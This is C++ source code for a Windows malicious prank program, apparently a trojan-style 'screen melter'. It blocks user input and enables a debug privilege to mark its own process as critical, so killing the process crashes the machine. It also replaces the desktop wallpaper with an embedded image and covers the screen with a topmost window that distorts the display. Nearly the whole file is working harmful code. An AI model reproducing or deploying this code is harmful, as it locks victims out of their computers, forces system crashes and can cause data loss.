#include "Header.h"

using namespace std;

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);

int ScreenWidth, ScreenHeight;
int Interval = 100;

LRESULT CALLBACK Melter(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	switch (Msg)
	{
		case WM_CREATE:
		{
			HDC Desktop = GetDC(HWND_DESKTOP);
			HDC Window = GetDC(hWnd);

			BitBlt(Window, 0, 0, ScreenWidth, ScreenHeight, Desktop, 0, 0, SRCCOPY);
			ReleaseDC(hWnd, Window);
			ReleaseDC(HWND_DESKTOP, Desktop);

			SetTimer(hWnd, 0, Interval, 0);
			ShowWindow(hWnd, SW_SHOW);
			break;
		}
		case WM_PAINT:
		{
			ValidateRect(hWnd, 0);
			break;
		}
		case WM_TIMER:
		{
			HDC Window = GetDC(hWnd);
			int X = (rand() % ScreenWidth) - (150 / 2),
				Y = (rand() % 15),
				Width = (rand() % 150);
			BitBlt(Window, X, Y, Width, ScreenHeight, Window, X, 0, SRCCOPY);
			ReleaseDC(hWnd, Window);
			break;
		}
		case WM_DESTROY:
		{
			KillTimer(hWnd, 0);
			PostQuitMessage(0);
			break;
		}
		default:
			return 0;
	}
	return DefWindowProc(hWnd, Msg, wParam, lParam);
}

// Add critical flag
void SetProcessAsCritical() {
	// Init mem
	ULONG BreakOnTermination;
	NTSTATUS status;
	// Set the flag to 1
	BreakOnTermination = 1;
	// Set the info to process
	status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
	// Check the output
	if (status != 0) {
		printf("NtSetInformationProcess failed with status %#x\n\n", status);
	}
	else {
		cout << "Enabled Successfully." << endl;
	}
}

// Remove critical flag
void UnSetProcessAsCritical() {
	// Init mem
	ULONG BreakOnTermination;
	NTSTATUS status;
	// Set the flag to 0
	BreakOnTermination = 0;
	// Set the info to process
	status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
	// Check the output
	if (status != 0) {
		printf("NtSetInformationProcess failed with status %#x\n", status);
	}
	else {
		printf("Canceled Successfully\n");
	}

}

// Check if program is running in elevated mode
BOOL EnableSeDebugPrivilege() {
	BOOLEAN bl;
	if (!NT_SUCCESS(RtlAdjustPrivilege(20, TRUE, FALSE, &bl))) {
		cout << "Error enabling SeDebugPrivilege. You have to run this program in an elevated console." << endl;
		return FALSE;
	}
	return TRUE;
}

// WIN entry point
int APIENTRY WinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPTSTR lpCmdLine,
	_In_ int nShowCmd
)
{
	// Disable keyboard (ctrl + alt + del will work)
	BlockInput(TRUE);
	// Make process critical
	if (EnableSeDebugPrivilege()) {
		SetProcessAsCritical();
	}
	// Make new file with jpg char array
	// TODO: change picture load
	ofstream savefile("log.jpg"); 
	for (int x = 0; x < 13609; x++) {
		savefile << *(jpg + x);
	}
	savefile.close();
	// Set the wallpaper
	const wchar_t* path = L"log.jpg";
	int result;
	result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)path, SPIF_UPDATEINIFILE);
	cout << result << endl;
	// Get the width & height of current display
	ScreenWidth = GetSystemMetrics(SM_CXSCREEN);
	ScreenHeight = GetSystemMetrics(SM_CYSCREEN);
	// TODO: add process description that is visible in Task Manager
	WNDCLASS wndClass = { 0, Melter, 0,0, hInstance, 0, LoadCursorW(0, (LPCWSTR)IDC_ARROW), 0, 0, "owo" };

	if (RegisterClass(&wndClass))
	{
		// Create the "melter" overlapping window.
		HWND hWnd = CreateWindowExA(WS_EX_TOPMOST, "owo", 0, WS_POPUP,
			0, 0, ScreenWidth, ScreenHeight, HWND_DESKTOP, 0, hInstance, 0);
		if (hWnd)
		{
			// Seed for randomization
			srand((unsigned int)GetTickCount64());
			MSG Msg = { 0 };
			// Run the melter loop
			while (Msg.message != WM_QUIT)
			{
				if (PeekMessage(&Msg, 0, 0, 0, PM_REMOVE)) {
					TranslateMessage(&Msg);
					DispatchMessage(&Msg);
				}
			}
		}
	}
	return 0;
}